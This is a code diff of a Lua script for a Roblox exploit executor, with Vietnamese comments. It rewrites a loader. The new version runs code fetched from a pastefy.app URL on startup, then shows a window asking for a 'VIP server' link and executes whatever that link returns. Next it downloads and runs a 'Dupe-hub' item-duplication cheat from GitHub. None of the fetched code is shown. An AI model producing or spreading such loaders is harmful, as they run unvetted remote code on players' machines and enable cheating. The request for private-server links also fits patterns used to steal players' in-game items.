@@ -1,73 +1,71 @@
--- Thực hiện tải và chạy 1 script từ URL an toàn bằng pcall
-local function fetchAndRun(url)
-    if not url or url == "" then
-        return false, "Empty URL"
-    end
+-- chạy script đầu
+pcall(function() loadstring(game:HttpGet('https://pastefy.app/AILhrbIZ/raw'))() end)
 
-    -- thử gọi HttpGet (nhiều executor dùng game:HttpGet)
-    local ok, body = pcall(function() return game:HttpGet(url) end)
-    if not ok or not body or body == "" then
-        return false, "Không tải được từ URL: " .. tostring(url)
-    end
+-- GUI ngắn gọn
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+local pg = plr:WaitForChild("PlayerGui")
 
-    -- chạy code trả về bằng loadstring trong pcall để bắt lỗi runtime
-    local ok2, res = pcall(function()
-        local fn = loadstring(body)
-        if not fn then error("loadstring trả về nil") end
-        return fn()
+local sg = Instance.new("ScreenGui")
+sg.ResetOnSpawn = false
+sg.Parent = pg
+
+local f = Instance.new("Frame", sg)
+f.Size = UDim2.new(0,300,0,120)
+f.Position = UDim2.new(0.5,-150,0.4,-60)
+f.BackgroundColor3 = Color3.fromRGB(30,30,30)
+f.BorderSizePixel = 0
+
+local tb = Instance.new("TextBox", f)
+tb.Size = UDim2.new(0.9,0,0,40)
+tb.Position = UDim2.new(0.05,0,0.08,0)
+tb.Text = ""                -- không chữ xám
+tb.PlaceholderText = ""     -- không chữ xám
+tb.ClearTextOnFocus = false
+tb.TextWrapped = true
+tb.Font = Enum.Font.SourceSans
+tb.TextSize = 18
+tb.BackgroundColor3 = Color3.fromRGB(50,50,50)
+tb.TextColor3 = Color3.fromRGB(255,255,255)
+
+local btn = Instance.new("TextButton", f)
+btn.Size = UDim2.new(0.6,0,0,36)
+btn.Position = UDim2.new(0.2,0,0.62,0)
+btn.Text = "Xác nhận"
+btn.Font = Enum.Font.SourceSansBold
+btn.TextSize = 18
+btn.BackgroundColor3 = Color3.fromRGB(0,120,200)
+btn.TextColor3 = Color3.fromRGB(255,255,255)
+
+local status = Instance.new("TextLabel", f)
+status.Size = UDim2.new(0.9,0,0,18)
+status.Position = UDim2.new(0.05,0,0.87,0)
+status.Text = ""
+status.TextSize = 14
+status.BackgroundTransparency = 1
+status.TextColor3 = Color3.fromRGB(200,200,200)
+status.Font = Enum.Font.SourceSans
+
+btn.MouseButton1Click:Connect(function()
+    local link = tb.Text and tb.Text:match("%S+") or ""
+    if link == "" then
+        status.Text = "Vui lòng nhập link server vip"
+        return
+    end
+    status.Text = "Đang tải..."
+    local ok,err = pcall(function() loadstring(game:HttpGet(link))() end)
+    if not ok then
+        status.Text = "Không chạy được script từ link: "..tostring(err)
+        return
+    end
+    -- nếu chạy thành công script 1 từ user link -> chạy script 2
+    local ok2,err2 = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/silentxvn/StealABrainrot/main/Dupe-hub.lua"))()
     end)
-
-    if not ok2 then
-        return false, "Lỗi khi chạy script từ URL: " .. tostring(url) .. " — " .. tostring(res)
-    end
-
-    return true, "OK"
-end
-
--- Cách nhập URL:
-local DEFAULT_URL1 = "https://pastefy.app/AILhrbIZ/raw" -- đổi nếu muốn
-local url1
-
-if type(rconsoleinput) == "function" then
-    -- interactive nếu executor hỗ trợ rconsoleinput
-    rconsoleprint("Nhập link script thứ nhất (hoặc dán vào) rồi Enter:\n")
-    url1 = rconsoleinput()
-    if not url1 or url1 == "" then
-        -- nếu người dùng không nhập, fallback về default
-        url1 = DEFAULT_URL1
-        rconsoleprint("Không nhập gì — sử dụng DEFAULT_URL1: "..url1.."\n")
-    end
-else
-    -- không có rconsoleinput -> dùng mặc định (bạn có thể sửa DEFAULT_URL1)
-    url1 = DEFAULT_URL1
-end
-
--- Tải và chạy script 1, nếu thành công mới tiếp tục
-local ok, msg = fetchAndRun(url1)
-if not ok then
-    -- thông báo lỗi, dừng; bạn có thể thay bằng print nếu rconsoleprint không có
-    if type(rconsoleprint) == "function" then
-        rconsoleprint("Lỗi: "..msg.."\n")
+    if ok2 then
+        status.Text = "Đã chạy script thứ 2"
+        sg:Destroy()
     else
-        warn("Lỗi: "..msg)
+        status.Text = "Lỗi khi chạy script 2: "..tostring(err2)
     end
-    return -- dừng không chạy tiếp
-end
-
--- Nếu đến đây thì script 1 chạy thành công -> chạy script 2
-local url2 = "https://raw.githubusercontent.com/silentxvn/StealABrainrot/main/Dupe-hub.lua"
-local ok2, msg2 = fetchAndRun(url2)
-if not ok2 then
-    if type(rconsoleprint) == "function" then
-        rconsoleprint("Lỗi khi chạy script 2: "..msg2.."\n")
-    else
-        warn("Lỗi khi chạy script 2: "..msg2)
-    end
-    return
-end
-
-if type(rconsoleprint) == "function" then
-    rconsoleprint("Cả 2 script đã chạy xong.\n")
-else
-    print("Cả 2 script đã chạy xong.")
-end
+end)
